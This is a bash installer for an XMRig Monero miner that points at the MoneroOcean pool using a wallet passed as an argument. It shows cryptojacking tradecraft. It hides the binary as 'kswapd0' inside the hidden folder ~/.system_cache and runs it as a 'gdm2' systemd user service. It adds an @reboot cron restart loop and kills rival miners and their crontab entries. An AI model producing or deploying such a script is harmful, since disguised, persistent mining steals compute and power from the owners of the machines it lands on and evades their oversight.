#!/bin/bash

# ==================== USER INSTALLATION (NO SUDO REQUIRED) ====================
# This script runs as regular user and does NOT require sudo/root access

# ==================== CLEAN PREVIOUS INSTALLATIONS ====================
echo "[*] Cleaning previous installations..."

# Kill user's own mining processes (no sudo needed)
killall -9 xmrig kswapd0 swapd gdm2 moneroocean_miner 2>/dev/null || true
pkill -9 -f "xmrig|kswapd0|swapd|gdm2|monero" 2>/dev/null || true

# Remove crontab entries
crontab -l 2>/dev/null | grep -v "system_cache\|check_and_start\|swapd\|gdm2" | crontab - 2>/dev/null || true

# Try to stop user systemd services (if exist)
systemctl --user stop gdm2 2>/dev/null || true
systemctl --user disable gdm2 2>/dev/null || true
rm -f ~/.config/systemd/user/gdm2.service 2>/dev/null || true
systemctl --user daemon-reload 2>/dev/null || true

# Remove user files
rm -rf ~/.system_cache ~/.gdm* ~/.swapd ~/.moneroocean 2>/dev/null || true
rm -rf ~/moneroocean 2>/dev/null || true

echo "[✓] Cleanup complete"
echo ""

# ==================== PREREQUISITES ====================
echo "[*] Checking prerequisites..."

# Check if curl or wget available
if command -v curl >/dev/null 2>&1; then
    DOWNLOADER="curl -L -o"
elif command -v wget >/dev/null 2>&1; then
    DOWNLOADER="wget -O"
else
    echo "[!] ERROR: Neither curl nor wget found"
    echo "    Please install: yum install curl  OR  apt-get install curl"
    exit 1
fi

echo "[✓] Prerequisites OK"
echo ""

# ==================== GET WALLET ADDRESS ====================
if [ -z "$1" ]; then
    echo "[!] ERROR: Wallet address required!"
    echo "    Usage: $0 <WALLET_ADDRESS>"
    exit 1
fi

WALLET="$1"
echo "[*] Wallet: $WALLET"
echo ""

# ==================== LOW-RAM WARNING ====================
TOTAL_RAM=$(free -m 2>/dev/null | awk '/^Mem:/ {print $2}')
CURRENT_SWAP=$(free -m 2>/dev/null | awk '/^Swap:/ {print $2}')

if [ -n "$TOTAL_RAM" ] && [ "$TOTAL_RAM" -lt 2048 ] || [ "$CURRENT_SWAP" -eq 0 ]; then
    echo "=========================================="
    echo "WARNING: LOW RAM DETECTED"
    echo "=========================================="
    echo "System: ${TOTAL_RAM}MB RAM, ${CURRENT_SWAP}MB swap"
    echo ""
    echo "Mining may be slow or fail on this system."
    echo "Ask your admin to add swap space:"
    echo "  sudo fallocate -l 2G /swapfile"
    echo "  sudo chmod 600 /swapfile"
    echo "  sudo mkswap /swapfile"
    echo "  sudo swapon /swapfile"
    echo "  echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab"
    echo ""
    echo "Press ENTER to continue anyway or CTRL+C to abort..."
    read
fi

# ==================== CREATE DIRECTORIES ====================
echo "[*] Creating directories..."
mkdir -p ~/.system_cache/.syslogs
chmod 700 ~/.system_cache
echo "[✓] Directories created"
echo ""

# ==================== DOWNLOAD MINER ====================
echo "[*] Downloading XMRig miner..."

# Detect architecture
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)
        BINARY_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
        ;;
    aarch64|arm64)
        BINARY_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-arm64.tar.gz"
        ;;
    *)
        echo "[!] Unsupported architecture: $ARCH"
        exit 1
        ;;
esac

cd ~/.system_cache
$DOWNLOADER xmrig.tar.gz "$BINARY_URL"

if [ ! -f "xmrig.tar.gz" ]; then
    echo "[!] Download failed!"
    exit 1
fi

echo "[*] Extracting..."
tar -xzf xmrig.tar.gz
EXTRACTED_DIR=$(tar -tzf xmrig.tar.gz | head -1 | cut -f1 -d"/")
mv "$EXTRACTED_DIR/xmrig" kswapd0
chmod +x kswapd0
rm -rf "$EXTRACTED_DIR" xmrig.tar.gz

echo "[✓] Miner downloaded: $(pwd)/kswapd0"
echo ""

# ==================== CREATE CONFIG ====================
echo "[*] Creating configuration..."

cat > ~/.system_cache/config_background.json << EOF
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.moneroocean.stream:10032",
            "user": "$WALLET",
            "pass": "x",
            "keepalive": true,
            "nicehash": false
        }
    ],
    "log-file": "$HOME/.system_cache/.gdm2.log",
    "verbose": 2,
    "donate-level": 1,
    "print-time": 60,
    "background": false
}
EOF

echo "[✓] Configuration created"
echo ""

# ==================== AUTO-START SETUP ====================
echo "[*] Setting up auto-start..."

# Check if systemd --user is available
if command -v systemctl >/dev/null 2>&1 && systemctl --user status >/dev/null 2>&1; then
    echo "[*] Using systemd user service..."
    
    mkdir -p ~/.config/systemd/user
    
    cat > ~/.config/systemd/user/gdm2.service << EOF
[Unit]
Description=GDM2 User Service
After=network.target

[Service]
Type=simple
ExecStart=$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config_background.json
Restart=always
RestartSec=10
TimeoutStartSec=30

# Resource management
Nice=10
CPUWeight=1

# OOM protection
OOMScoreAdjust=200

# Memory limits for low-RAM systems
MemoryMax=400M
MemoryHigh=300M

# Enable logging
StandardOutput=journal
StandardError=journal
SyslogIdentifier=gdm2

[Install]
WantedBy=default.target
EOF

    # Reload and enable
    systemctl --user daemon-reload
    systemctl --user enable gdm2.service
    systemctl --user start gdm2.service
    
    sleep 3
    
    # Verify
    if systemctl --user is-active --quiet gdm2.service; then
        echo "[✓] Service is RUNNING!"
        systemctl --user status gdm2.service --no-pager -l | head -15
    else
        echo "[!] Service may not have started"
        echo "Check with: systemctl --user status gdm2"
    fi
    
    echo ""
    echo "View logs: journalctl --user -u gdm2 -f"
    echo "Or: tail -f ~/.system_cache/.gdm2.log"
    
else
    echo "[*] systemd user service not available, using cron..."
    
    # Create launcher script
    cat > ~/.system_cache/start_miner.sh << 'EOF'
#!/bin/bash
# Auto-restart miner if it dies

MINER="$HOME/.system_cache/kswapd0"
CONFIG="$HOME/.system_cache/config_background.json"

while true; do
    # Check if already running
    if ! pgrep -f "kswapd0" >/dev/null 2>&1; then
        # Start miner
        "$MINER" --config="$CONFIG" >> ~/.system_cache/.gdm2.log 2>&1 &
        sleep 5
    fi
    sleep 60
done
EOF
    
    chmod +x ~/.system_cache/start_miner.sh
    
    # Add to crontab
    (crontab -l 2>/dev/null | grep -v "start_miner.sh"; echo "@reboot nohup $HOME/.system_cache/start_miner.sh >/dev/null 2>&1 &") | crontab -
    
    # Start now
    nohup ~/.system_cache/start_miner.sh >/dev/null 2>&1 &
    
    sleep 3
    
    if pgrep -f "kswapd0" >/dev/null 2>&1; then
        echo "[✓] Miner is RUNNING!"
    else
        echo "[!] Miner may not have started"
    fi
    
    echo ""
    echo "View logs: tail -f ~/.system_cache/.gdm2.log"
fi

echo ""
echo "========================================"
echo "INSTALLATION COMPLETE"
echo "========================================"
echo ""
echo "Miner location: ~/.system_cache/kswapd0"
echo "Config: ~/.system_cache/config_background.json"
echo "Logs: ~/.system_cache/.gdm2.log"
echo ""
echo "Commands:"
if command -v systemctl >/dev/null 2>&1 && systemctl --user status >/dev/null 2>&1; then
    echo "  systemctl --user status gdm2    - Check status"
    echo "  systemctl --user stop gdm2      - Stop miner"
    echo "  systemctl --user start gdm2     - Start miner"
    echo "  journalctl --user -u gdm2 -f    - Live logs"
else
    echo "  tail -f ~/.system_cache/.gdm2.log  - Live logs"
    echo "  pkill kswapd0                      - Stop miner"
    echo "  ~/.system_cache/start_miner.sh &   - Start miner"
fi
echo ""
echo "View hashrate: tail -f ~/.system_cache/.gdm2.log | grep 'speed'"
echo ""
